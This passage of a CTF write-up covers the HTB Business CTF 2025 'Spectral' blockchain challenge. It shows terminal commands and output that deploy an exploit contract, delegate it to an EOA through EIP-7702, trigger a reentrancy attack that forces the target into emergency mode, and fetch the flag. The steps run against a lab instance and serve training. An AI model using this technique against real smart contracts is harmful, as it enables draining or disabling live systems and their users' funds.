┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ forge init --force
Warning: Target directory is not empty, but `--force` was specified
Initializing /home/kali/ctf/blockchain/business_ctf_2025/spectral/blockchain-spectral...
Installing forge-std in /home/kali/ctf/blockchain/business_ctf_2025/spectral/blockchain-spectral/lib/forge-std (url: Some("https://github.com/foundry-rs/forge-std"), tag: None)
Cloning into '/home/kali/ctf/blockchain/business_ctf_2025/spectral/blockchain-spectral/lib/forge-std'...
remote: Enumerating objects: 2117, done.
remote: Counting objects: 100% (1048/1048), done.
remote: Compressing objects: 100% (154/154), done.
remote: Total 2117 (delta 960), reused 906 (delta 894), pack-reused 1069 (from 1)
Receiving objects: 100% (2117/2117), 682.08 KiB | 2.93 MiB/s, done.
Resolving deltas: 100% (1436/1436), done.
    Installed forge-std v1.9.7
    Initialized forge project

# Deploy Exploit.sol
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ forge create --rpc-url $RPC --private-key $PK --broadcast src/exploit.sol:Exploit --constructor-args $TARGET
[⠊] Compiling...
[⠒] Compiling 2 files with Solc 0.8.29
[⠢] Solc 0.8.29 finished in 33.97ms
Compiler run successful with warnings:
Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
  --> src/exploit.sol:29:28:
   |
29 |     function deliverEnergy(uint256 amount) external override returns (bool) {
   |                            ^^^^^^^^^^^^^^

Deployer: 0xe9d025CbA085Eba172AF7a30a5f0bF2988d48987
Deployed to: 0x1B783E5518A008Ad638d19934734D4267fE20a2E
Transaction hash: 0x9b518df927bd2f89e89f47ff9c61127cc1b0e902c1138017f70d5a2b6340bb64


# Export Exploit.sol as environment variable
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ export EXPLOIT=0x1B783E5518A008Ad638d19934734D4267fE20a2E
```

### Register Player's EOA as Gateway (Spectral)
Lets call the registerGateway() function in VCNK.sol by providing the address as player in this context
```#!/bin/bash
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ cast send $TARGET "registerGateway(address)" $PLAYER --value 20ether --rpc-url $RPC --private-key $PK

blockHash            0x3323f74ba4d245dd7f32b2e50e33878a778eaa35a537ca19fe219ed1677a7b03
blockNumber          3
contractAddress      
cumulativeGasUsed    74601
effectiveGasPrice    1000000000
from                 0xe9d025CbA085Eba172AF7a30a5f0bF2988d48987
gasUsed              74601
logs                 [{"address":"0x07c85180a2744920b62b246150bf828cef903e54","topics":["0x18eacfcb80f18277666c9aaa9f292d376a4fdb0058757cc563a0f20ab0be120b","0x000000000000000000000000e9d025cba085eba172af7a30a5f0bf2988d48987"],"data":"0x","blockHash":"0x3323f74ba4d245dd7f32b2e50e33878a778eaa35a537ca19fe219ed1677a7b03","blockNumber":"0x3","blockTimestamp":"0x683811a2","transactionHash":"0x0303c5f8bbd857fa9acdeaa1c89c3bdfdfe72816dca58ec1cdc011ffef8233f9","transactionIndex":"0x0","logIndex":"0x0","removed":false}]
logsBloom            0x00000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100400000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000800800000000000000000000000000000000020000000000000000000000000000000000000000000000000001000000000000000000000000000000
root                 
status               1 (success)
transactionHash      0x0303c5f8bbd857fa9acdeaa1c89c3bdfdfe72816dca58ec1cdc011ffef8233f9
transactionIndex     0
type                 2
blobGasPrice         1
blobGasUsed          
to                   0x07C85180a2744920B62B246150BF828CeF903e54
```

### Deposit Player's ETH Quota Gateway (Spectral)
Lets call the requestQuotaIncrease() function in VCNK.sol by providing the address as player in this context
```#!/bin/bash
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ cast send $TARGET "requestQuotaIncrease(address)" $PLAYER --value 10ether --rpc-url $RPC --private-key $PK

blockHash            0xcb3ac64ba7151c32dfce43e5223e72c6859f311a311f6a787c2da070e4bcb9de
blockNumber          4
contractAddress      
cumulativeGasUsed    72844
effectiveGasPrice    1000000000
from                 0xe9d025CbA085Eba172AF7a30a5f0bF2988d48987
gasUsed              72844
logs                 [{"address":"0x07c85180a2744920b62b246150bf828cef903e54","topics":["0xb0e98ca922f9ad3cbd25ab949b19ea0c6897b757a42a7540fd4bfd39bfba19c4","0x000000000000000000000000e9d025cba085eba172af7a30a5f0bf2988d48987"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0xcb3ac64ba7151c32dfce43e5223e72c6859f311a311f6a787c2da070e4bcb9de","blockNumber":"0x4","blockTimestamp":"0x68381232","transactionHash":"0xa74b3a7d6f73b2c05fe5a21ba2cf61126541cb045fde5111c34f6aab00bd957c","transactionIndex":"0x0","logIndex":"0x0","removed":false}]
logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000400000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000800800000000000000000000000000000000020000000000000000000000004000000000000000000000000001000000000000000000000000000000
root                 
status               1 (success)
transactionHash      0xa74b3a7d6f73b2c05fe5a21ba2cf61126541cb045fde5111c34f6aab00bd957c
transactionIndex     0
type                 2
blobGasPrice         1
blobGasUsed          
to                   0x07C85180a2744920B62B246150BF828CeF903e54
```

This function will mapping address as the Gateway (struct) by using gateways as the function
```solidity
# struct
struct Gateway {
    uint8 status;
    uint256 quota;
    uint256 totalUsage;
  }

# Mapping
mapping(address => Gateway) public gateways;
```

Lets confirm the gateway status to check if the player's EOA is registered and the quota is added. As the result the status is in **IDLE Mode** and the quota is successfully added to **player address**
```#!/bin/bash
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ cast call $TARGET "gateways(address)(uint8,uint256,uint256)" $PLAYER --rpc-url $RPC
1
10000000000000000000 [1e19]
0
```

### Add the other's EOA to the player's EOA in exploit's contract code (Spectral)
Lets use the other's EOA by using the documentation from berachain, an arbitrary (but validly formatted) EOA and private key are used to set the player’s EOA with the `Exploit.sol` code:
Link:
https://docs.berachain.com/developers/guides/eip7702-basics
```#!/bin/bash
# Other's EOA
OTHER_PLAYER=0x70997970C51812dc3A010C7d01b50e0d17dc79C8 OTHER_PK=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d

# Set up env variable for separate signing account for EIP-7702 transaction
# https://docs.berachain.com/developers/guides/eip7702-basics
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ export OTHER_PLAYER=0x70997970C51812dc3A010C7d01b50e0d17dc79C8

┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ export OTHER_PK=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
```

Lets send the other account 1 ETH for Auth Transaction
```#!/bin/bash
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ cast send $OTHER_PLAYER --value 1ether --rpc-url $RPC --private-key $PK

blockHash            0x06529ca6431c5ecb2cecd524228e14c11433aba156933f50d9153372fefc8095
blockNumber          5
contractAddress      
cumulativeGasUsed    21000
effectiveGasPrice    1000000000
from                 0xe9d025CbA085Eba172AF7a30a5f0bF2988d48987
gasUsed              21000
logs                 []
logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                 
status               1 (success)
transactionHash      0x07c908e4a28b01770cf90604ccd26660cbe90bdc8df25848d51cc6afb3247764
transactionIndex     0
type                 2
blobGasPrice         1
blobGasUsed          
to                   0x70997970C51812dc3A010C7d01b50e0d17dc79C8
```

Lets set SIGNED_AUTH as the variable
Link:
https://docs.berachain.com/developers/guides/eip7702-basics#step-5-set-helloworld-code-for-eoa
```#!/bin/bash
# Created Authorization for player's EOA and exploit contract
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ SIGNED_AUTH=$(cast wallet sign-auth $EXPLOIT --private-key $PK --rpc-url $RPC)
```

Lets set the exploit.sol code for player's EOA
```#!/bin/bash
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ cast send $(cast az) --private-key $OTHER_PK --auth $SIGNED_AUTH --rpc-url $RPC

blockHash            0x2f44c4482547f97805e4597e98e703aaccce0ebeeeef1480c2ad8743432205f5
blockNumber          6
contractAddress      
cumulativeGasUsed    36800
effectiveGasPrice    1000000000
from                 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
gasUsed              36800
logs                 []
logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                 
status               1 (success)
transactionHash      0x4837ca4207a62dba328bcd31dd1a43fb4ba74cdae1ab7564289b7ab8a5685b23
transactionIndex     0
type                 4
blobGasPrice         1
blobGasUsed          
to                   0x0000000000000000000000000000000000000000
```

Got the transaction hash. Lets confirm and verify the authorization list
Link:
https://docs.berachain.com/developers/guides/eip7702-basics#step-6-verify-authorization-list
```#!/bin/bash
# Set transactionHash as variable
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ transactionHash=0x4837ca4207a62dba328bcd31dd1a43fb4ba74cdae1ab7564289b7ab8a5685b23

# Confirm and Verify the Authorization List with transaction hash
# Notice the address (0x1B783E5518A008Ad638d19934734D4267fE20a2E, exploit contract)
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ cast tx $transactionHash --rpc-url $RPC

blockHash            0x2f44c4482547f97805e4597e98e703aaccce0ebeeeef1480c2ad8743432205f5
blockNumber          6
from                 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
transactionIndex     0
effectiveGasPrice    1000000000

accessList           []
authorizationList    [{"chainId":"0x7a69","address":"0x1b783e5518a008ad638d19934734d4267fe20a2e","nonce":"0x4","yParity":"0x0","r":"0x925e0a4eed6161b99193ed5456f68dc7b3ce14b6bea4add6c5b6bf5bd8f47516","s":"0x4664749ffd85d3231185200247edf4dd4dabea9ae33e21de11ca87525623b28a"}]
chainId              31337
gasLimit             46000
hash                 0x4837ca4207a62dba328bcd31dd1a43fb4ba74cdae1ab7564289b7ab8a5685b23
input                0x
maxFeePerGas         1000000000
maxPriorityFeePerGas 1000000000
nonce                0
r                    0x9404ddca45c515dc4b126236064dda6e600874a2ac1c5f471af066c58a58aba4
s                    0x7caee85584eb5640658f896ce1dcea5962c3abc2de4edac4f498220c23e41898
to                   0x0000000000000000000000000000000000000000
type                 4
value                0
yParity              0
```

Verify Player's EOA Code if it set
Link:
https://docs.berachain.com/developers/guides/eip7702-basics#step-7-verify-eoa-code-set
```#!/bin/bash
# https://docs.berachain.com/developers/guides/eip7702-basics#step-7-verify-eoa-code-set

┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ cast code $PLAYER --rpc-url $RPC
0xef01001b783e5518a008ad638d19934734d4267fe20a2e
```

### Initialize Player's EOA Code (Spectral)
Because storage initialization typically happens when a contract is deployed and the `Exploit.sol` code is simply being set for the player’s EOA, the `initialize()` function is called to allocate the `owner` and `target` variables from the `Exploit.sol` constructor
```#!/bin/bash
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ cast send $PLAYER "initialize(address)" --private-key $OTHER_PK --rpc-url $RPC $TARGET

blockHash            0x994938020f5aaa4b947909a5ee68e1c9e032c755fe321cfda8697aca7f2fec3f
blockNumber          7
contractAddress      
cumulativeGasUsed    66277
effectiveGasPrice    1000000000
from                 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
gasUsed              66277
logs                 []
logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                 
status               1 (success)
transactionHash      0x143878f8cca7e90839e54eebb6f871da2a7a25393804f47b378b18713c49c711
transactionIndex     0
type                 2
blobGasPrice         1
blobGasUsed          
to                   0xe9d025CbA085Eba172AF7a30a5f0bF2988d48987
```

### Call the exploit() function to trigger Reentrancy Attack (Spectral)
Lets confirm if controlUnit is in IDLE MODE
```#!/bin/bash
# Confirm is controlUnit is in IDLE MODE
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ cast call $TARGET "controlUnit()(uint8)" --rpc-url $RPC 
1

┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ cast call $TARGET "controlUnit() returns (uint8)" --rpc-url $RPC
1
```

Lets perform reentrancy attack by call the exploit() function
```#!/bin/bash
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ cast send $PLAYER "exploit()" --rpc-url $RPC --private-key $PK

blockHash            0x27d6fd3972a4ed6977f2dcf38017401495fbe9748729094007b9a5a80d2e3932
blockNumber          8
contractAddress      
cumulativeGasUsed    157658
effectiveGasPrice    1000000000
from                 0xe9d025CbA085Eba172AF7a30a5f0bF2988d48987
gasUsed              157658
logs                 [{"address":"0x07c85180a2744920b62b246150bf828cef903e54","topics":["0x3283b72465e6fb1c5a42840f14b0a024a2ecf0ac5478cfff3338b7fe4d1373de","0x000000000000000000000000e9d025cba085eba172af7a30a5f0bf2988d48987"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0x27d6fd3972a4ed6977f2dcf38017401495fbe9748729094007b9a5a80d2e3932","blockNumber":"0x8","blockTimestamp":"0x68381f77","transactionHash":"0xae782b38f286a1e024c69939bc9e788d0369da669f6276d500f6bca1ba53d0a0","transactionIndex":"0x0","logIndex":"0x0","removed":false},{"address":"0x07c85180a2744920b62b246150bf828cef903e54","topics":["0x3283b72465e6fb1c5a42840f14b0a024a2ecf0ac5478cfff3338b7fe4d1373de","0x000000000000000000000000e9d025cba085eba172af7a30a5f0bf2988d48987"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0x27d6fd3972a4ed6977f2dcf38017401495fbe9748729094007b9a5a80d2e3932","blockNumber":"0x8","blockTimestamp":"0x68381f77","transactionHash":"0xae782b38f286a1e024c69939bc9e788d0369da669f6276d500f6bca1ba53d0a0","transactionIndex":"0x0","logIndex":"0x1","removed":false},{"address":"0x07c85180a2744920b62b246150bf828cef903e54","topics":["0x3283b72465e6fb1c5a42840f14b0a024a2ecf0ac5478cfff3338b7fe4d1373de","0x000000000000000000000000e9d025cba085eba172af7a30a5f0bf2988d48987"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0x27d6fd3972a4ed6977f2dcf38017401495fbe9748729094007b9a5a80d2e3932","blockNumber":"0x8","blockTimestamp":"0x68381f77","transactionHash":"0xae782b38f286a1e024c69939bc9e788d0369da669f6276d500f6bca1ba53d0a0","transactionIndex":"0x0","logIndex":"0x2","removed":false},{"address":"0x07c85180a2744920b62b246150bf828cef903e54","topics":["0x3283b72465e6fb1c5a42840f14b0a024a2ecf0ac5478cfff3338b7fe4d1373de","0x000000000000000000000000e9d025cba085eba172af7a30a5f0bf2988d48987"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0x27d6fd3972a4ed6977f2dcf38017401495fbe9748729094007b9a5a80d2e3932","blockNumber":"0x8","blockTimestamp":"0x68381f77","transactionHash":"0xae782b38f286a1e024c69939bc9e788d0369da669f6276d500f6bca1ba53d0a0","transactionIndex":"0x0","logIndex":"0x3","removed":false},{"address":"0x07c85180a2744920b62b246150bf828cef903e54","topics":["0x3283b72465e6fb1c5a42840f14b0a024a2ecf0ac5478cfff3338b7fe4d1373de","0x000000000000000000000000e9d025cba085eba172af7a30a5f0bf2988d48987"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0x27d6fd3972a4ed6977f2dcf38017401495fbe9748729094007b9a5a80d2e3932","blockNumber":"0x8","blockTimestamp":"0x68381f77","transactionHash":"0xae782b38f286a1e024c69939bc9e788d0369da669f6276d500f6bca1ba53d0a0","transactionIndex":"0x0","logIndex":"0x4","removed":false},{"address":"0x07c85180a2744920b62b246150bf828cef903e54","topics":["0x3283b72465e6fb1c5a42840f14b0a024a2ecf0ac5478cfff3338b7fe4d1373de","0x000000000000000000000000e9d025cba085eba172af7a30a5f0bf2988d48987"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0x27d6fd3972a4ed6977f2dcf38017401495fbe9748729094007b9a5a80d2e3932","blockNumber":"0x8","blockTimestamp":"0x68381f77","transactionHash":"0xae782b38f286a1e024c69939bc9e788d0369da669f6276d500f6bca1ba53d0a0","transactionIndex":"0x0","logIndex":"0x5","removed":false},{"address":"0x07c85180a2744920b62b246150bf828cef903e54","topics":["0x3283b72465e6fb1c5a42840f14b0a024a2ecf0ac5478cfff3338b7fe4d1373de","0x000000000000000000000000e9d025cba085eba172af7a30a5f0bf2988d48987"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0x27d6fd3972a4ed6977f2dcf38017401495fbe9748729094007b9a5a80d2e3932","blockNumber":"0x8","blockTimestamp":"0x68381f77","transactionHash":"0xae782b38f286a1e024c69939bc9e788d0369da669f6276d500f6bca1ba53d0a0","transactionIndex":"0x0","logIndex":"0x6","removed":false},{"address":"0x07c85180a2744920b62b246150bf828cef903e54","topics":["0x3283b72465e6fb1c5a42840f14b0a024a2ecf0ac5478cfff3338b7fe4d1373de","0x000000000000000000000000e9d025cba085eba172af7a30a5f0bf2988d48987"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0x27d6fd3972a4ed6977f2dcf38017401495fbe9748729094007b9a5a80d2e3932","blockNumber":"0x8","blockTimestamp":"0x68381f77","transactionHash":"0xae782b38f286a1e024c69939bc9e788d0369da669f6276d500f6bca1ba53d0a0","transactionIndex":"0x0","logIndex":"0x7","removed":false},{"address":"0x07c85180a2744920b62b246150bf828cef903e54","topics":["0x3283b72465e6fb1c5a42840f14b0a024a2ecf0ac5478cfff3338b7fe4d1373de","0x000000000000000000000000e9d025cba085eba172af7a30a5f0bf2988d48987"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0x27d6fd3972a4ed6977f2dcf38017401495fbe9748729094007b9a5a80d2e3932","blockNumber":"0x8","blockTimestamp":"0x68381f77","transactionHash":"0xae782b38f286a1e024c69939bc9e788d0369da669f6276d500f6bca1ba53d0a0","transactionIndex":"0x0","logIndex":"0x8","removed":false},{"address":"0x07c85180a2744920b62b246150bf828cef903e54","topics":["0x668880833047d9c4cc8495889d2618ca84c7f186db6ac66c29a7322826973dc6"],"data":"0x","blockHash":"0x27d6fd3972a4ed6977f2dcf38017401495fbe9748729094007b9a5a80d2e3932","blockNumber":"0x8","blockTimestamp":"0x68381f77","transactionHash":"0xae782b38f286a1e024c69939bc9e788d0369da669f6276d500f6bca1ba53d0a0","transactionIndex":"0x0","logIndex":"0x9","removed":false},{"address":"0x07c85180a2744920b62b246150bf828cef903e54","topics":["0xc303f77669a8be84fee7899b99ddeab599993e5ead94a9589b41831140a12902","0x000000000000000000000000e9d025cba085eba172af7a30a5f0bf2988d48987"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0x27d6fd3972a4ed6977f2dcf38017401495fbe9748729094007b9a5a80d2e3932","blockNumber":"0x8","blockTimestamp":"0x68381f77","transactionHash":"0xae782b38f286a1e024c69939bc9e788d0369da669f6276d500f6bca1ba53d0a0","transactionIndex":"0x0","logIndex":"0xa","removed":false},{"address":"0x07c85180a2744920b62b246150bf828cef903e54","topics":["0xc303f77669a8be84fee7899b99ddeab599993e5ead94a9589b41831140a12902","0x000000000000000000000000e9d025cba085eba172af7a30a5f0bf2988d48987"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0x27d6fd3972a4ed6977f2dcf38017401495fbe9748729094007b9a5a80d2e3932","blockNumber":"0x8","blockTimestamp":"0x68381f77","transactionHash":"0xae782b38f286a1e024c69939bc9e788d0369da669f6276d500f6bca1ba53d0a0","transactionIndex":"0x0","logIndex":"0xb","removed":false},{"address":"0x07c85180a2744920b62b246150bf828cef903e54","topics":["0xc303f77669a8be84fee7899b99ddeab599993e5ead94a9589b41831140a12902","0x000000000000000000000000e9d025cba085eba172af7a30a5f0bf2988d48987"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0x27d6fd3972a4ed6977f2dcf38017401495fbe9748729094007b9a5a80d2e3932","blockNumber":"0x8","blockTimestamp":"0x68381f77","transactionHash":"0xae782b38f286a1e024c69939bc9e788d0369da669f6276d500f6bca1ba53d0a0","transactionIndex":"0x0","logIndex":"0xc","removed":false},{"address":"0x07c85180a2744920b62b246150bf828cef903e54","topics":["0xc303f77669a8be84fee7899b99ddeab599993e5ead94a9589b41831140a12902","0x000000000000000000000000e9d025cba085eba172af7a30a5f0bf2988d48987"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0x27d6fd3972a4ed6977f2dcf38017401495fbe9748729094007b9a5a80d2e3932","blockNumber":"0x8","blockTimestamp":"0x68381f77","transactionHash":"0xae782b38f286a1e024c69939bc9e788d0369da669f6276d500f6bca1ba53d0a0","transactionIndex":"0x0","logIndex":"0xd","removed":false},{"address":"0x07c85180a2744920b62b246150bf828cef903e54","topics":["0xc303f77669a8be84fee7899b99ddeab599993e5ead94a9589b41831140a12902","0x000000000000000000000000e9d025cba085eba172af7a30a5f0bf2988d48987"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0x27d6fd3972a4ed6977f2dcf38017401495fbe9748729094007b9a5a80d2e3932","blockNumber":"0x8","blockTimestamp":"0x68381f77","transactionHash":"0xae782b38f286a1e024c69939bc9e788d0369da669f6276d500f6bca1ba53d0a0","transactionIndex":"0x0","logIndex":"0xe","removed":false},{"address":"0x07c85180a2744920b62b246150bf828cef903e54","topics":["0xc303f77669a8be84fee7899b99ddeab599993e5ead94a9589b41831140a12902","0x000000000000000000000000e9d025cba085eba172af7a30a5f0bf2988d48987"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0x27d6fd3972a4ed6977f2dcf38017401495fbe9748729094007b9a5a80d2e3932","blockNumber":"0x8","blockTimestamp":"0x68381f77","transactionHash":"0xae782b38f286a1e024c69939bc9e788d0369da669f6276d500f6bca1ba53d0a0","transactionIndex":"0x0","logIndex":"0xf","removed":false},{"address":"0x07c85180a2744920b62b246150bf828cef903e54","topics":["0xc303f77669a8be84fee7899b99ddeab599993e5ead94a9589b41831140a12902","0x000000000000000000000000e9d025cba085eba172af7a30a5f0bf2988d48987"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0x27d6fd3972a4ed6977f2dcf38017401495fbe9748729094007b9a5a80d2e3932","blockNumber":"0x8","blockTimestamp":"0x68381f77","transactionHash":"0xae782b38f286a1e024c69939bc9e788d0369da669f6276d500f6bca1ba53d0a0","transactionIndex":"0x0","logIndex":"0x10","removed":false},{"address":"0x07c85180a2744920b62b246150bf828cef903e54","topics":["0xc303f77669a8be84fee7899b99ddeab599993e5ead94a9589b41831140a12902","0x000000000000000000000000e9d025cba085eba172af7a30a5f0bf2988d48987"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0x27d6fd3972a4ed6977f2dcf38017401495fbe9748729094007b9a5a80d2e3932","blockNumber":"0x8","blockTimestamp":"0x68381f77","transactionHash":"0xae782b38f286a1e024c69939bc9e788d0369da669f6276d500f6bca1ba53d0a0","transactionIndex":"0x0","logIndex":"0x11","removed":false},{"address":"0x07c85180a2744920b62b246150bf828cef903e54","topics":["0xc303f77669a8be84fee7899b99ddeab599993e5ead94a9589b41831140a12902","0x000000000000000000000000e9d025cba085eba172af7a30a5f0bf2988d48987"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0x27d6fd3972a4ed6977f2dcf38017401495fbe9748729094007b9a5a80d2e3932","blockNumber":"0x8","blockTimestamp":"0x68381f77","transactionHash":"0xae782b38f286a1e024c69939bc9e788d0369da669f6276d500f6bca1ba53d0a0","transactionIndex":"0x0","logIndex":"0x12","removed":false}]
logsBloom            0x00000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000400000400000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020800800000000000000000020020200000000020000000000000004000000000000000000000000000000000001000000000000000000000000000000
root                 
status               1 (success)
transactionHash      0xae782b38f286a1e024c69939bc9e788d0369da669f6276d500f6bca1ba53d0a0
transactionIndex     0
type                 2
blobGasPrice         1
blobGasUsed          
to                   0xe9d025CbA085Eba172AF7a30a5f0bF2988d48987
```

### Confirm VCNK.sol's control unit status is CU_STATUS_EMERGENCY (Spectral)
Lets confirm if control unit is in EMERGENCY MODE
```#!/bin/bash
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ cast call $TARGET "controlUnit()(uint8)" --rpc-url $RPC                 
3

┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ cast call $TARGET "controlUnit() returns (uint8)" --rpc-url $RPC               
3
```

Also check if **isSolved()** returns True. Yep it returns **true**
```#!/bin/bash
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ cast call $SETUP "isSolved()" --rpc-url $RPC
0x0000000000000000000000000000000000000000000000000000000000000001
```

### Get the Flag (Spectral)
```#!/bin/bash
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ nc 94.237.60.161 48806
1 - Get connection information
2 - Restart instance
3 - Get flag
Select action (enter number): 3
HTB{Pectra_UpGr4d3_c4uSed_4_sp3cTraL_bL@cK0Ut_1n_V0LnaYa}
```
